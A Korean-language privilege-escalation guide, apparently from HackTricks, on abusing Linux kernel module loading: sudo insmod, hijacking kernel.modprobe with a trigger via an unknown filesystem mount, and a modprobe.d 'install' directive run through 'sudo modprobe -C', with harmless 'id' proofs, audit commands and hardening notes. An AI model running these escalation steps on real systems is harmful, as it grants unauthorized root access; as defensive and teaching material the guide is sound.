# Kernel Modules 및 modprobe Abuse

{{#include ../../banners/hacktricks-training.md}}

## 커널 모듈 및 모듈 로딩 misconfiguration

Linux privilege escalation 검토에서 커널 모듈 지원은 영향도가 높은 영역입니다. 모든 unsigned-module 메시지를 그 자체로 exploit 가능하다고 간주하지 말고, 이를 활용해 실질적인 질문에 답해야 합니다.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- 현재 사용자가 `sudo`, capabilities 또는 writable helper path를 통해 모듈을 로드할 수 있는가?
- 모듈 로딩이 여전히 활성화되어 있는가?
- 모듈 signature enforcement가 비활성화되어 있는가?
- 모듈 디렉터리, 모듈 파일 또는 `modprobe.d` configuration path에 쓰기 권한이 있는가?<sup>[[16]](#references)</sup>
- 발생한 일을 확인하기 위해 kernel logs를 읽을 수 있는가?

Quick triage는 다음과 같은 module-status, signature, logging 및 module-tree 확인으로 시작합니다.<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>
```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```
해석:

- `modules_disabled=1`은 모듈을 load하거나 unload할 수 없음을 의미하며, reboot하기 전까지 값을 `0`으로 reset할 수 없습니다.<sup>[[1]](#references)</sup>
- kernel command line의 `module.sig_enforce=1` 또는 `CONFIG_MODULE_SIG_FORCE=y`는 유효하게 서명된 모듈을 요구합니다. 그렇지 않으면 서명되지 않은 모듈이 load되어 kernel을 taint할 수 있습니다.<sup>[[2]](#references)</sup>
- `dmesg_restrict=0`은 `dmesg`에 제한을 적용하지 않음을 의미하며, `1`이면 access에 `CAP_SYSLOG`가 필요합니다.<sup>[[1]](#references)</sup>
- `/lib/modules/$(uname -r)/` 아래의 writable path는 위험합니다. 모듈을 load할 때 `modprobe`가 해당 tree와 dependency data를 검색하기 때문입니다.<sup>[[8]](#references)</sup>

### 모듈 load 및 kernel output 읽기

local 모듈을 load할 정당한 권한이 있다면 `insmod`는 지정한 정확한 `.ko` file을 insert합니다. 모듈의 init function은 load 과정의 일부로 실행되며, `printk()`로 작성된 message는 kernel log buffer로 전달되고 일반적으로 `dmesg`로 읽습니다.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

최소한의 review workflow에서는 `modinfo`를 사용해 metadata를 inspect하고, `insmod`와 `rmmod`를 사용해 모듈을 load 및 remove하며, `lsmod`로 load된 state를 확인하고, `dmesg`로 kernel log를 inspect합니다.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```
`sudo -l`에서 `insmod`, `modprobe` 또는 이를 감싼 wrapper를 허용한다면 critical로 간주해야 합니다. `sudo -l`은 호출한 사용자의 권한을 나열하며, kernel module을 로드하려면 `CAP_SYS_MODULE`이 필요합니다. 직접적인 capability 기반 경로는 [Linux capabilities](../interesting-files-permissions/linux-capabilities.md#cap_sys_module)를 참조하세요.<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>
```bash
sudo -l
sudo /sbin/insmod ./example.ko
```
### `insmod` 실행이 허용된 Sudo

사용자가 `insmod`를 실행할 수 있도록 허용하는 sudo 규칙은 일반적인 관리용 helper를 허용하는 것과 비교할 수 없습니다. 모듈의 초기화 코드는 삽입 과정의 일부로 실행되므로, 실제 검토 시 확인할 질문은 이 사용자가 로드할 모듈을 선택하거나 수정할 수 있는지 여부입니다.<sup>[[3]](#references)</sup>

다음의 일반적인 검토 흐름은 후보 모듈에 대해 검사, 로드, 상태, 로그 및 제거 확인을 반복합니다.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```
사용자가 임의의 `.ko` 파일을 제공할 수 있다면, 승인된 assessment에서는 해당 규칙을 전체 system compromise로 간주해야 합니다. 더 안전한 운영 방식은 sudo를 통한 module loading 위임을 피하는 것입니다. 불가피한 경우에는 정확한 경로, 소유권, 권한, signing policy 및 제거 workflow를 제한해야 합니다.<sup>[[3]](#references)[[10]](#references)</sup>

제어된 lab에서 harmless한 module-building 패턴을 사용하는 경우, 아래에 최소한의 source와 Makefile을 제시합니다. `make -C /lib/modules/$(uname -r)/build M=$PWD` 형식은 external modules에 대한 kernel의 문서화된 kbuild workflow를 따릅니다.<sup>[[5]](#references)[[7]](#references)</sup>
```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
printk(KERN_INFO "demo module loaded\n");
return 0;
}

static void __exit demo_exit(void) {
printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
승인된 lab에서만 build 및 load하십시오. kbuild는 external module을 build하고, load/remove commands는 kernel module interfaces를 호출합니다.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>
```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```
### `kernel.modprobe` / `modprobe_path` 악용 점검

`kernel.modprobe`는 module autoload 요청에 대해 kernel이 실행하는 userspace helper를 지정합니다. 이 sysctl은 명시적인 module insertion이 아니라 autoloading에 영향을 줍니다. 공격자가 이를 쓰기 가능한 executable path로 변경하고 module request를 트리거할 수 있다면, 해당 helper는 privileged code-execution 경로가 됩니다. 빈 문자열로 설정하면 autoload 요청이 비활성화됩니다. `CONFIG_STATIC_USERMODEHELPER=y`인 경우, 비어 있지 않은 값은 compile 시 지정된 static helper path로 재정의됩니다.<sup>[[1]](#references)</sup>

kernel sysctl interface를 통해 현재 helper path를 확인하고 대상의 소유권과 mode를 검사합니다.<sup>[[1]](#references)</sup>
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```
sysctl, 위임된 sudo 규칙 또는 파일 capabilities를 조작할 수 있는지 확인합니다.<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>
```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```
다음 lab 전용 패턴은 helper 경로를 변경하고 문서화된 module-autoload 요청을 트리거합니다. 격리된 승인 시스템에서만 사용하십시오.<sup>[[1]](#references)</sup>

현재 Linux 커널에서는 알 수 없는 executable을 일반적인 트리거로 사용하지 마십시오. 기존의 custom binary-format module autoloading은 Linux 6.14에서 제거되었으며, 커널 문서에서는 알 수 없는 filesystem type을 module-autoload 요청 경로로 명시하고 있습니다.<sup>[[1]](#references)[[11]](#references)</sup>
```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```
강화된 시스템에서는 권한으로 인해 권한이 없는 사용자가 `kernel.modprobe`에 쓰기 작업을 수행할 수 없거나, helper 경로에 쓰기 권한이 없거나, module autoloading이 비활성화된 경우 이 작업이 실패해야 합니다.<sup>[[1]](#references)</sup>

### 쓰기 가능한 `modprobe.d` configuration 및 `sudo modprobe -C`

module을 확인하기 전에 `modprobe`는 우선순위에 따라 `/etc/modprobe.d`, `/run/modprobe.d`, `/usr/local/lib/modprobe.d`, `/usr/lib/modprobe.d`, `/lib/modprobe.d`와 같은 configuration 디렉터리에서 `.conf` 파일을 읽습니다. 우선순위가 더 높은 디렉터리에 동일한 이름의 파일이 있으면 우선순위가 더 낮은 파일을 가립니다. 더 중요한 점은 `install <module> <command>` 지시문이 해당 module을 삽입하는 **대신** 임의의 shell command를 실행한다는 것입니다. 따라서 쓰기 가능한 configuration 경로는 이후 권한 있는 `modprobe` 호출자의 credentials로 지연된 command 실행을 수행하는 수단이 될 수 있으며, kernel module signature enforcement는 이 userspace command를 authenticate하지 않습니다.<sup>[[16]](#references)</sup>

디렉터리 및 파일 권한을 audit한 다음, 유효한 configuration을 검사합니다. `modprobe -n -v`는 dry-run mode에서 module을 삽입하거나 `install`/`remove` command를 실행하지 않으므로 resolution 검토에 안전합니다. 현재 kmod documentation에서는 legacy `--showconfig` 표기를 kmod 36 이후 제거 대상으로 표시하므로 `modprobe -c`를 사용합니다.<sup>[[8]](#references)[[16]](#references)</sup>
```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
[ -e "$d" ] || continue
find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
/etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
/usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```
`modprobe`에 대한 제한 없는 sudo 규칙은 임의의 `.ko` 파일이 signature verification을 통과할 수 없는 경우에도 exploit할 수 있습니다. `-C`는 공격자가 제어하는 configuration directory를 선택하며, 해당 디렉터리에서 `install` command가 sudo로 실행된 process에 의해 실행될 수 있습니다.<sup>[[8]](#references)[[16]](#references)</sup>
```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```
완화를 위해 sudo를 통한 인자 제한 없는 `modprobe`를 허용하지 말고, 모든 configuration 디렉터리를 root 소유로 유지하며 쓰기 가능하지 않도록 해야 합니다. 또한 예상하지 못한 `install`/`remove` 지시문을 검토해야 합니다. 신뢰할 수 있는 관리 workflow에서 특정 모듈 하나에 대해 이러한 지시문을 우회해야 하는 경우, `modprobe --ignore-install`은 지정된 모듈에 대한 지시문을 무시하지만, dependency에는 자체 명령이 있을 수 있습니다.<sup>[[8]](#references)[[16]](#references)</sup>

### 쓰기 가능한 `/lib/modules` 검토

쓰기 가능한 모듈 디렉터리는 이후 `modprobe`가 호출되는 방식에 따라 모듈 교체, malicious module planting 또는 auto-load 악용을 허용할 수 있습니다. `modprobe`는 모듈을 확인할 때 `/lib/modules/$(uname -r)`를 검색하고 dependency 데이터를 사용합니다.<sup>[[8]](#references)</sup>

활성 kernel release의 모듈 트리에서 쓰기 가능한 모듈 파일과 dependency/alias metadata를 검토해야 합니다.<sup>[[8]](#references)</sup>
```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```
쓰기 가능한 module content를 찾았다면 `modprobe`가 dependencies를 확인하는 방식과 `modinfo`가 module metadata를 보고하는 방식을 조사하세요.<sup>[[8]](#references)[[12]](#references)</sup>
```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```
방어 참고 사항:

- `/lib/modules`가 `root:root` 소유이고 사용자가 쓰기할 수 없도록 유지합니다.<sup>[[8]](#references)</sup>
- 운영상 가능한 경우 부팅 후 `kernel.modules_disabled=1`을 설정합니다.<sup>[[1]](#references)</sup>
- loadable modules가 필요한 시스템에서는 module signing을 적용합니다.<sup>[[2]](#references)</sup>
- `/proc/sys/kernel/modprobe`, `/lib/modules`, `modprobe.d` configuration directories에 대한 쓰기 작업과 예상하지 못한 `insmod`/`modprobe` 실행을 모니터링합니다.<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## References

- [1] [/proc/sys/kernel/ 문서 — Linux Kernel 문서](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Kernel module signing 기능 — Linux Kernel 문서](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Driver 기본 사항 — Linux Kernel 문서](https://docs.kernel.org/driver-api/basics.html)
- [6] [printk를 사용한 메시지 logging — Linux Kernel 문서](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [External Modules 빌드 — Linux Kernel 문서](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [Merge tag 'execve-v6.14-rc1' — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
{{#include ../../banners/hacktricks-training.md}}
